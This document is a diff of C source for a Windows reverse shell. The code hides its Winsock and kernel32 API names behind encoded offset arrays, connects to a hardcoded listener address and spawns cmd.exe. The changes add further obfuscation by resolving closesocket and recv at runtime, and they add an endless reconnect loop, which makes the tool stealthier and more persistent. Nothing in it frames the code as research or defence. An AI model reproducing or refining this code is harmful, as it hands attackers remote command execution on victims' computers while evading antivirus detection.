@@ -1,8 +1,6 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <windows.h>
-#include <winsock2.h>
-#include <ws2tcpip.h>
 #define MAX 600
 //compile with -lws2_32
 
@@ -54,6 +52,7 @@ int main(void){
 	int _p__0rt=1234; //PUT SERVER PORT HERE
 	char recv_buffer[MAX];
 	char ALL_ALPHANUM[]="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._";
+	int connect;
 	
 	// --- START GET OFFSETS --- //
 	//char offset[]="kernel32.dll";
@@ -71,9 +70,11 @@ int main(void){
 	int wait_for_single_object_offset[] = {48,0,8,19,31,14,17,44,8,13,6,11,4,40,1,9,4,2,19};
 	int create_process_A_offset[] = {28,17,4,0,19,4,41,17,14,2,4,18,18,26,};
 	int exe_c_C_M_d_offset[] = {2,12,3,62,4,23,4};	//cmd.exe
-	int listener_addr_offset[] = {53,61,54,62,53,58,60,62,53,62,54,52}; 	//192.168.1.20
+	int listener_addr_offset[] = {53,61,54,62,53,58,60,62,53,62,57,52}; 	//192.168.1.50
 	int dll_ws2__32_offset[] = {22,18,54,63,55,54,62,3,11,11};
 	int dll_k_er_32_offset[] = {10,4,17,13,4,11,55,54,62,3,11,11};
+	int close_sock_offset[] = {2,11,14,18,4,18,14,2,10,4,19};
+	int recv_offset[] = {17,4,2,21};
 	
 	
 	// uncomment that block when you want to know the offset for other functions
@@ -108,6 +109,8 @@ int main(void){
 	FARPROC inet_addr_func = GetProcAddress(hDLL_ws2__32, GetOriginal(inet_addr_offset,ALL_ALPHANUM,sizeof(inet_addr_offset)));;
 	FARPROC wsa_connect_func = GetProcAddress(hDLL_ws2__32,GetOriginal(wsa_connect_offset,ALL_ALPHANUM,sizeof(wsa_connect_offset)));
 	FARPROC wsa_cleanup_func = GetProcAddress(hDLL_ws2__32,GetOriginal(wsa_cleanup_offset,ALL_ALPHANUM,sizeof(wsa_cleanup_offset)));
+	FARPROC close_sock_func = GetProcAddress(hDLL_ws2__32,GetOriginal(close_sock_offset,ALL_ALPHANUM,sizeof(close_sock_offset)));
+	FARPROC recv_func = GetProcAddress(hDLL_ws2__32,GetOriginal(recv_offset,ALL_ALPHANUM,sizeof(recv_offset)));
 	//printf("[+] GOT ALL FUNCTION ADDRESSES FROM THE ws2_32.dll\n");
 	
 	FARPROC create_process_A_func = GetProcAddress(hDLL_k_er_32,GetOriginal(create_process_A_offset,ALL_ALPHANUM,sizeof(create_process_A_offset)));
@@ -137,24 +140,30 @@ int main(void){
 	server_addr.sin_addr.s_addr=inet_addr_func(GetOriginal(listener_addr_offset,ALL_ALPHANUM,sizeof(listener_addr_offset)));
 	if ( server_addr.sin_addr.s_addr == INADDR_NONE ){
 		//printf("[x] invalid address\n[x]exiting\n");
-		closesocket(client_socket);
-		WSACleanup();
+		close_sock_func(client_socket);
+		wsa_cleanup_func();
 		exit(1);
 		
 	};
 
 	//connect to server
 	//printf("[+] connecting to server\n");
-	int connect = wsa_connect_func(client_socket,(SOCKADDR *)&server_addr,sizeof(server_addr),NULL,NULL,NULL,NULL);	
+	
+	do{
+		connect = wsa_connect_func(client_socket,(SOCKADDR *)&server_addr,sizeof(server_addr),NULL,NULL,NULL,NULL);	
+		
+	} while (connect != 0);
+	
+	/*
 	if (connect != 0){
 		//printf("[x] can't connect to server\n");
-		closesocket(client_socket);
+		close_sock_func(client_socket);
 		wsa_cleanup_func();
 		exit(1);
 	}
-	
+	*/
 	//recieve data
-	recv(client_socket,recv_buffer,sizeof(recv_buffer),0);	
+	recv_func(client_socket,recv_buffer,sizeof(recv_buffer),0);	
 
 
 
@@ -184,11 +193,8 @@ int main(void){
  
 	//CLEANUP	
 	memset(recv_buffer,0,sizeof(recv_buffer));
-	closesocket(client_socket);
+	close_sock_func(client_socket);
 	wsa_cleanup_func();
 	return 0;
-	
-
-	
 }
 
